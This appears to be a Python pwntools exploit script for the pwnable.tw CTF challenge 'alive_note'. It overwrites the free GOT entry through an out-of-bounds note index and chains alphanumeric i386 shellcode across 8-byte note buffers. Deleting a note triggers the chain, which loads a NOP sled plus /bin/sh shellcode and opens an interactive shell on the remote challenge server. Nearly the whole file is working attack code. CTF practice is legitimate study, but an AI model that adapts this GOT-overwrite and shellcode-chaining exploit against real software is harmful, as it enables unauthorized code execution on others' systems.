#!/usr/bin/env python3

import pwn

if pwn.args['LOCAL']:
	io = pwn.process(['./alive_note'])
else:
	io = pwn.remote('chall.pwnable.tw', 10300)

elf = pwn.ELF('./alive_note')


#shellcode = pwn.asm('''
	#xor al, 0x32
	#xor al, 0x33
	#xor al, 0x34
	#xor al, 0x35
#''')
shellcode0 = 'PYjAXEqH'
shellcode1 = '4AHEEEqH'

def add_note(index, data, pad = False):
	io.recvuntil('Your choice :')
	io.sendline(str(1))
	io.recvuntil('Index :')
	io.sendline(str(index))
	io.recvuntil('Name :')
	io.sendline(data)
	if not pad:
		for i in range(3):
			add_note(9, 'A' * 8, True)

def delete_note(index):
	io.recvuntil('Your choice :')
	io.sendline(str(3))
	io.recvuntil('Index :')
	if pwn.args['GDB']:	
		pwn.context.terminal = ['tmux', 'splitw', '-h']
		pwn.gdb.attach(io, '''
			source ~/peda/peda.py
			break 'free@plt'
		''')
	io.sendline(str(index))

	
# add note -> overwrite got table of free
# build shellcode chain

pwn.context.arch = 'i386'
shellcode0 = pwn.asm('''
	push eax
	pop ecx
	push 0x47
	pop eax
	push eax
	jnz short $+0x3a

	xor al, 0x38
	push eax
	pop edx
	inc edx
	push edx
	jnz short $+0x3a
	
	pop eax
	xor [ecx + 0x42], eax
	xor al, 0x4d
	jnz short $+0x3a

	xor [ecx + 0x41], eax
	push eax
	pop edx
	push eax
	jnz short $+0x3a

	push 0x33
	pop eax
	xor al, 0x30
	push eax
	jnz short $+0x3a

	push eax
''')

free_got = (elf.got[b'free'] - elf.sym[b'note']) // 4
for i in range(6):
	index = free_got if i == 0 else i - 1
	add_note(index, shellcode0[i * 8 : (i + 1) * 8])

delete_note(3)

shellcode1 = b'\x90' * 67 + pwn.asm(pwn.shellcraft.sh())
io.sendline(shellcode1)

io.interactive()
